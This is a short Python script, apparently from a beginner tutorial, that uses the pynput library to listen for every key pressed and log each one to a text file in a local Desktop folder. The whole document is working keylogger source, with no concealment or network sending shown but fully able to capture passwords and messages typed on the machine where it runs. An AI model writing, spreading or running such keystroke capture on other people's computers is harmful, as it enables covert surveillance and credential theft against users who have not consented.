from pynput.keyboard import Key, Listener # import basic modules that we downloaded
import logging #another module pre-installed.
log_dir='C:\\Users\\prana\\Desktop\\logger\\logs\\' #Directory in which you want to store your text files in(which contains all the keys pressed)
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG)
                                        #name of text file
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
    
#copy rest of code.
